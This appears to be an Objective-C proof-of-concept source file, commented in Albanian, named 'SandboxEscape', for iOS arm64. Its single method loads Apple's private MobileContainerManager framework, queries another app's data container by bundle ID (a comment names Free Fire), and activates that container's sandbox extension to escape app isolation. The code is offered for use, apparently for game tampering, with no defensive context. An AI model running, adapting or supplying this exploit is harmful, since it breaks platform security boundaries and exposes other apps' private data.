// SandboxEscape.m / ObjC / arm64 / MobileHouseArrest PoC (Class 2)
#import "SandboxEscape.h"
#import <dlfcn.h>
#import <xpc/xpc.h> // Përdorim librarinë standarde të Apple për XPC

typedef void *container_query_t; 
typedef void *container_object_t;

@interface SandboxEscape () { int64_t _handle; BOOL _escaped; } @end

@implementation SandboxEscape
- (BOOL)escaped { return _escaped; } 
- (int64_t)sandboxHandle { return _handle; }

+ (instancetype)escapeForBundleID:(NSString *)bundleID error:(NSError **)err {
    // 1. Hap MCM (MobileContainerManager)
    void *h = dlopen("/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager", RTLD_NOW);
    if (!h) { 
        if(err)*err=[NSError errorWithDomain:@"sbx" code:1 userInfo:@{NSLocalizedDescriptionKey:@"MCM dlopen failed"}]; 
        return nil; 
    }
    
    container_query_t (*query_create)(void) = dlsym(h, "container_query_create");
    void (*query_set_class)(container_query_t, unsigned) = dlsym(h, "container_query_set_class");
    // Tani përdorim xpc_object_t të vërtetë nga Apple, pa konflikte
    void (*query_set_ids)(container_query_t, xpc_object_t) = dlsym(h, "container_query_set_ids");
    void (*query_set_flags)(container_query_t, uint64_t) = dlsym(h, "container_query_set_flags");
    void (*query_set_part)(container_query_t, uint64_t) = dlsym(h, "container_query_set_part"); 
    
    container_object_t (*query_result)(container_query_t) = dlsym(h, "container_query_get_single_result");
    bool (*activate)(container_object_t, bool) = dlsym(h, "container_object_sandbox_extension_activate");
    void (*query_free)(container_query_t) = dlsym(h, "container_query_free");

    if (!query_create || !query_set_class || !query_set_ids || !query_set_flags || !query_result || !activate) { 
        if(err)*err=[NSError errorWithDomain:@"sbx" code:2 userInfo:@{NSLocalizedDescriptionKey:@"missing MCM symbols"}]; 
        return nil; 
    }

    // 2. Krijo query
    container_query_t q = query_create(); 
    if (!q) { if(err)*err=[NSError errorWithDomain:@"sbx" code:3 userInfo:nil]; return nil; }
    
    // 3. Konfiguro sipas PoC
    query_set_class(q, 2); // Klasa 2 = App Data
    
    // Përdorim funksionin standard xpc_string_create të Apple
    xpc_object_t identifier = xpc_string_create(bundleID.UTF8String);
    query_set_ids(q, identifier);
    
    query_set_flags(q, UINT64_C(0x900000000));
    
    if (query_set_part != NULL) {
        query_set_part(q, 0);
    }

    // 4. Merr objektin (container-in e Free Fire)
    container_object_t obj = query_result(q);
    if (!obj) { 
        if(query_free) query_free(q); 
        if(err)*err=[NSError errorWithDomain:@"sbx" code:4 userInfo:@{NSLocalizedDescriptionKey:@"no container"}]; 
        return nil; 
    }

    // 5. Aktivizo sandbox extension direkt
    bool activated = activate(obj, false);
    if (!activated) {
        if(query_free) query_free(q); 
        if(err)*err=[NSError errorWithDomain:@"sbx" code:5 userInfo:@{NSLocalizedDescriptionKey:@"activate failed"}]; 
        return nil; 
    }
    
    if(query_free) query_free(q);

    SandboxEscape *s = [SandboxEscape new]; 
    s->_handle = 1; // Si shenjë suksesi
    s->_escaped = YES;
    NSLog(@"[Motor] SANDBOX ESCAPED with bundle=%@", bundleID);
    return s;
}
@end
